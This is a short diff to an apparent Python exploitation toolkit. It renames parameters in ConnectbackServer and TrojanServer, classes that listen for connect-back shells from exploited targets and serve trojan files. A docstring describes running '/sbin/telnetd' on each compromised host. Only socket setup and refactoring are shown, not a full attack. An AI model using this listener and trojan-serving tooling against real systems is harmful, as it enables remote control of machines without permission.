@@ -21,13 +21,13 @@ class ConnectbackServer(object):
     listener" that has an API and can be used programmatically.
     """
     MAX_READ=1024
-    def __init__(self,connectback_host,startcmd=None,connectback_shell=True):
+    def __init__(self,connectback_ip,port=8080,startcmd=None,connectback_shell=True):
         """
         Class constructor.
 
         Parameters
         ----------
-        callback_ip: the address this server should bind to.
+        connectback_ip: the address this server should bind to.
         port: Optional. The port this server should bind to.  Default value is
             8080.
         startcmd: Optional.  A command string to issue to the remote host upon
@@ -42,11 +42,11 @@ class ConnectbackServer(object):
         targets) and automatically kick off a telnet sever on each one, then,
         for each exploited target, you could construct a ConnectbackServer like
         so:
-            server=ConnectbackServer(connectback_host,startcmd='/sbin/telnetd',connectback_shell=False)
+            server=ConnectbackServer(connectback_ip,startcmd='/sbin/telnetd',connectback_shell=False)
         """
         self.pid=None
-        self.callback_ip=connectback_host.callback_ip
-        self.port=connectback_host.port
+        self.connectback_ip=connectback_ip
+        self.port=port
         self.startcmd=startcmd
         self.connectback_shell=connectback_shell
 
@@ -59,7 +59,7 @@ class ConnectbackServer(object):
                 socket.AF_INET,socket.SOCK_STREAM)
         serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 
-        serversocket.bind((self.callback_ip,int(self.port)))
+        serversocket.bind((self.connectback_ip,int(self.port)))
         serversocket.listen(5)
         return serversocket
 
@@ -166,8 +166,8 @@ class ConnectbackServer(object):
 
 
 class TrojanServer(ConnectbackServer):
-    def __init__(self,connectback_host,files_to_serve,startcmd=None,connectback_shell=False):
-        super(self.__class__,self).__init__(connectback_host,startcmd=startcmd,connectback_shell=connectback_shell)
+    def __init__(self,connectback_ip,files_to_serve,port=8080,startcmd=None,connectback_shell=False):
+        super(self.__class__,self).__init__(connectback_ip,port=port,startcmd=startcmd,connectback_shell=connectback_shell)
         self.files_to_serve=files_to_serve
         self.connectback_shell=connectback_shell
 
@@ -196,7 +196,7 @@ class TrojanServer(ConnectbackServer):
         serversocket.close()
 
         if self.connectback_shell == True:
-            print "Serving callback_shell."
+            print "Serving connectback_shell."
             #no return
             self.__serve_connectback_shell()
 
